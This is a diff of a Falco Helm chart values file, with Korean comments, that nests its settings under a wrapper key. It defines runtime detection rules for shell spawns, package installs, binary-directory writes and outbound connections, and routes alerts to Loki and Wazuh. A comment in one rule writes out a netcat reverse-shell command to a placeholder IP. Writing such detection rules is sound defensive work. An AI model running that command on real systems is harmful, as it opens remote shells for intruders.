@@ -1,158 +1,150 @@
-# Why: Falco Helm Chart values.yaml
+# Why: Falco Helm Chart values.yaml (Wrapper Chart용)
 # Purpose: Configure Falco runtime security with custom rules and Wazuh SIEM integration
+# Note: Wrapper Chart이므로 모든 설정을 'falco:' 키 아래에 작성
 
-collectors:
-  containerEngine:
-    kind: auto
+falco:
+  collectors:
+    containerEngine:
+      kind: auto
 
-customRules:
-  blog-rules.yaml: |
-    # ==================================================================
-    # Rule 1: Java Process Spawning Shell (RCE 방어) - CRITICAL
-    # ==================================================================
-    # 목적: Spring Boot(Java) 프로세스가 shell을 실행하면 RCE 공격 의심
-    # 예시: Log4Shell, Spring4Shell 같은 취약점 악용
-    # 정상 시나리오: Java가 shell을 실행할 이유 없음 (0%)
-    - rule: Java Process Spawning Shell
-      desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)
-      condition: >
-        spawned_process and
-        proc.pname exists and
-        proc.pname in (java, javac) and
-        proc.name in (bash, sh, ksh, zsh, dash) and
-        container
-      output: >
-        🚨 CRITICAL: Java 프로세스가 Shell을 실행했습니다 (RCE 공격 의심!)
-          (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
-           parent=%proc.pname cmd=%proc.cmdline container=%container.name)
-      priority: CRITICAL
-      tags: [maturity_stable, host, container, process, mitre_execution, T1059, rce, java]
-    
-    # ==================================================================
-    # Rule 2: Package Manager in Container (Immutability 위반) - WARNING
-    # ==================================================================
-    # 목적: 운영 중 컨테이너에서 패키지 설치 감지 (불변성 원칙 위반)
-    # 정상 시나리오: 빌드 시에만 패키지 설치, 런타임엔 절대 안 함
-    # 악의적 시나리오: 해커가 공격 도구 설치 (netcat, nmap 등)
-    - rule: Launch Package Management Process in Container
-      desc: Package management process ran inside container (Immutability violation)
-      condition: >
-        spawned_process and
-        container and
-        proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and
-        not proc.pname in (package_mgmt_binaries)
-      output: >
-        ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
-          (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
+  customRules:
+    blog-rules.yaml: |
+      # ==================================================================
+      # Rule 1: Java Process Spawning Shell (RCE 방어) - CRITICAL
+      # ==================================================================
+      # 목적: Spring Boot(Java) 프로세스가 shell을 실행하면 RCE 공격 의심
+      # 예시: Log4Shell, Spring4Shell 같은 취약점 악용
+      # 정상 시나리오: Java가 shell을 실행할 이유 없음 (0%)
+      - rule: Java Process Spawning Shell
+        desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)
+        condition: >
+          spawned_process and
+          proc.pname exists and
+          proc.pname in (java, javac) and
+          proc.name in (bash, sh, ksh, zsh, dash) and
+          container
+        output: >
+          🚨 CRITICAL: Java 프로세스가 Shell을 실행했습니다 (RCE 공격 의심!)
+            (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
+             parent=%proc.pname cmd=%proc.cmdline container=%container.name)
+        priority: CRITICAL
+        tags: [maturity_stable, host, container, process, mitre_execution, T1059, rce, java]
+
+      # ==================================================================
+      # Rule 2: Package Manager in Container (Immutability 위반) - WARNING
+      # ==================================================================
+      # 목적: 운영 중 컨테이너에서 패키지 설치 감지 (불변성 원칙 위반)
+      # 정상 시나리오: 빌드 시에만 패키지 설치, 런타임엔 절대 안 함
+      # 악의적 시나리오: 해커가 공격 도구 설치 (netcat, nmap 등)
+      - rule: Launch Package Management Process in Container
+        desc: Package management process ran inside container (Immutability violation)
+        condition: >
+          spawned_process and
+          container and
+          proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and
+          not proc.pname in (package_mgmt_binaries)
+        output: >
+          ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!
+            (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
+             cmd=%proc.cmdline container=%container.name)
+        priority: WARNING
+        tags: [maturity_stable, container, process, mitre_execution, T1059]
+
+      # ==================================================================
+      # Rule 3: Write to Binary Directory (Drift Detection) - ERROR
+      # ==================================================================
+      # 목적: 시스템 디렉토리에 파일 쓰기 시도 감지 (악성코드 설치)
+      # 정상 시나리오: /bin, /usr/bin, /sbin은 읽기 전용
+      # 악의적 시나리오: 백도어 바이너리 설치, rootkit 설치
+      - rule: Write to Binary Dir
+        desc: Attempt to write to system binary directories
+        condition: >
+          open_write and
+          container and
+          (fd.name startswith /bin/ or
+           fd.name startswith /usr/bin/ or
+           fd.name startswith /sbin/ or
+           fd.name startswith /usr/sbin/)
+        output: >
+          🔴 ERROR: 바이너리 디렉토리에 쓰기 시도 감지!
+          (user=%user.name file=%fd.name pod=%k8s.pod.name
+           namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)
+        priority: ERROR
+        tags: [maturity_stable, container, filesystem, mitre_persistence, T1543]
+
+      # ==================================================================
+      # Rule 4: Unexpected Outbound Connection (Reverse Shell 방어) - NOTICE
+      # ==================================================================
+      # 목적: 예상치 못한 외부 연결 감지 (C&C 서버 통신, 데이터 유출)
+      # 주의: 노이즈가 많을 수 있으니 초기엔 NOTICE로 설정, 튜닝 필요
+      # 정상 시나리오: DB(3306), 내부 API(8080), HTTPS(443) 연결
+      # 악의적 시나리오: 해커 C&C 서버로 역쉘 연결 (nc -e /bin/sh 1.2.3.4 4444)
+      - rule: Unexpected Outbound Connection
+        desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
+        condition: >
+          outbound and
+          container and
+          fd.type in (ipv4, ipv6) and
+          not fd.lport in (80, 443, 8080, 3306, 53) and
+          not fd.sip in ("127.0.0.1", "::1") and
+          not proc.name in (curl, wget, git)
+        output: >
+          🔵 NOTICE: 예상치 못한 외부 연결 시도 감지
+          (connection=%fd.name lport=%fd.lport rport=%fd.rport
+            pod=%k8s.pod.name namespace=%k8s.ns.name
            cmd=%proc.cmdline container=%container.name)
-      priority: WARNING
-      tags: [maturity_stable, container, process, mitre_execution, T1059]
-    
-    # ==================================================================
-    # Rule 3: Write to Binary Directory (Drift Detection) - ERROR
-    # ==================================================================
-    # 목적: 시스템 디렉토리에 파일 쓰기 시도 감지 (악성코드 설치)
-    # 정상 시나리오: /bin, /usr/bin, /sbin은 읽기 전용
-    # 악의적 시나리오: 백도어 바이너리 설치, rootkit 설치
-    - rule: Write to Binary Dir
-      desc: Attempt to write to system binary directories
-      condition: >
-        open_write and
-        container and
-        (fd.name startswith /bin/ or
-         fd.name startswith /usr/bin/ or
-         fd.name startswith /sbin/ or
-         fd.name startswith /usr/sbin/)
-      output: >
-        🔴 ERROR: 바이너리 디렉토리에 쓰기 시도 감지!
-        (user=%user.name file=%fd.name pod=%k8s.pod.name
-         namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)
-      priority: ERROR
-      tags: [maturity_stable, container, filesystem, mitre_persistence, T1543]
-    
-    # ==================================================================
-    # Rule 4: Unexpected Outbound Connection (Reverse Shell 방어) - NOTICE
-    # ==================================================================
-    # 목적: 예상치 못한 외부 연결 감지 (C&C 서버 통신, 데이터 유출)
-    # 주의: 노이즈가 많을 수 있으니 초기엔 NOTICE로 설정, 튜닝 필요
-    # 정상 시나리오: DB(3306), 내부 API(8080), HTTPS(443) 연결
-    # 악의적 시나리오: 해커 C&C 서버로 역쉘 연결 (nc -e /bin/sh 1.2.3.4 4444)
-    - rule: Unexpected Outbound Connection
-      desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
-      condition: >
-        outbound and
-        container and
-        fd.type in (ipv4, ipv6) and
-        not fd.lport in (80, 443, 8080, 3306, 53) and
-        not fd.sip in ("127.0.0.1", "::1") and
-        not proc.name in (curl, wget, git)
-      output: >
-        🔵 NOTICE: 예상치 못한 외부 연결 시도 감지
-        (connection=%fd.name lport=%fd.lport rport=%fd.rport
-          pod=%k8s.pod.name namespace=%k8s.ns.name
-         cmd=%proc.cmdline container=%container.name)
-      priority: NOTICE
-      tags: [maturity_incubating, container, network, mitre_exfiltration, T1041]
+        priority: NOTICE
+        tags: [maturity_incubating, container, network, mitre_exfiltration, T1041]
 
-# Why: modern_ebpf driver 사용 (성능 최적화)
-driver:
-  kind: modern_ebpf
+  # Why: modern_ebpf driver 사용 (성능 최적화)
+  driver:
+    kind: modern_ebpf
 
-# Why: Falco → Falcosidekick HTTP 출력 활성화
-http_output:
-  enabled: true
-  url: http://falco-falcosidekick:2801/
-  insecure: true
-
-# Why: JSON 출력 활성화 (Structured logging)
-json_output: true
-json_include_output_property: true
-
-# Why: Log level 설정
-log_level: info
-priority: info
-
-# Why: inotify handler 비활성화 (Chart 8.0.0 크래시 방지)
-watch_config_files: false
-
-# Why: gRPC 출력 활성화 (Falcosidekick 연동)
-grpc:
-  enabled: true
-  bind_address: unix:///run/falco/falco.sock
-  threadiness: 0
-
-grpc_output:
-  enabled: true
-
-# Why: Falcosidekick 활성화 (이벤트 라우터)
-falcosidekick:
-  enabled: true
-  config:
-    loki:
-      hostport: http://loki-stack.monitoring.svc.cluster.local:3100
-      minimumpriority: warning
-    talon:
-      address: http://falco-talon.falco.svc.cluster.local:2803
-      minimumpriority: warning
-    # Why: Wazuh SIEM 연동 (Syslog 프로토콜)
-    # Note: 515 포트 사용 (Wazuh Syslog 전용 포트, 1514는 Agent 전용)
-    # Note: wazuh Service DNS 사용 (ClusterIP Service, 515/TCP 노출)
-    syslog:
-      host: wazuh.security.svc.cluster.local
-      port: "515"
-      protocol: tcp
-      format: json
-      minimumpriority: info
-  resources:
-    limits:
-      cpu: 100m
-      memory: 128Mi
-    requests:
-      cpu: 20m
-      memory: 64Mi
-  webui:
+  # Why: Falco → Falcosidekick HTTP 출력 활성화
+  http_output:
     enabled: true
-    replicaCount: 1
+    url: http://falco-falcosidekick:2801/
+    insecure: true
+
+  # Why: JSON 출력 활성화 (Structured logging)
+  json_output: true
+  json_include_output_property: true
+
+  # Why: Log level 설정
+  log_level: info
+  priority: info
+
+  # Why: inotify handler 비활성화 (Chart 8.0.0 크래시 방지)
+  watch_config_files: false
+
+  # Why: gRPC 출력 활성화 (Falcosidekick 연동)
+  grpc:
+    enabled: true
+    bind_address: unix:///run/falco/falco.sock
+    threadiness: 0
+
+  grpc_output:
+    enabled: true
+
+  # Why: Falcosidekick 활성화 (이벤트 라우터)
+  falcosidekick:
+    enabled: true
+    config:
+      loki:
+        hostport: http://loki-stack.monitoring.svc.cluster.local:3100
+        minimumpriority: warning
+      talon:
+        address: http://falco-talon.falco.svc.cluster.local:2803
+        minimumpriority: warning
+      # Why: Wazuh SIEM 연동 (Syslog 프로토콜)
+      # Note: 515 포트 사용 (Wazuh Syslog 전용 포트, 1514는 Agent 전용)
+      # Note: wazuh Service DNS 사용 (ClusterIP Service, 515/TCP 노출)
+      syslog:
+        host: wazuh.security.svc.cluster.local
+        port: "515"
+        protocol: tcp
+        format: json
+        minimumpriority: info
     resources:
       limits:
         cpu: 100m
@@ -160,25 +152,35 @@ falcosidekick:
       requests:
         cpu: 20m
         memory: 64Mi
+    webui:
+      enabled: true
+      replicaCount: 1
+      resources:
+        limits:
+          cpu: 100m
+          memory: 128Mi
+        requests:
+          cpu: 20m
+          memory: 64Mi
 
-podSecurityContext: {}
+  podSecurityContext: {}
 
-resources:
-  limits:
-    cpu: 500m
-    memory: 512Mi
-  requests:
-    cpu: 100m
-    memory: 256Mi
+  resources:
+    limits:
+      cpu: 500m
+      memory: 512Mi
+    requests:
+      cpu: 100m
+      memory: 256Mi
 
-serviceAccount:
-  create: true
-  name: falco
+  serviceAccount:
+    create: true
+    name: falco
 
-tolerations:
-  - effect: NoSchedule
-    key: node-role.kubernetes.io/control-plane
-    operator: Exists
-  - effect: NoSchedule
-    key: node-role.kubernetes.io/master
-    operator: Exists
+  tolerations:
+    - effect: NoSchedule
+      key: node-role.kubernetes.io/control-plane
+      operator: Exists
+    - effect: NoSchedule
+      key: node-role.kubernetes.io/master
+      operator: Exists
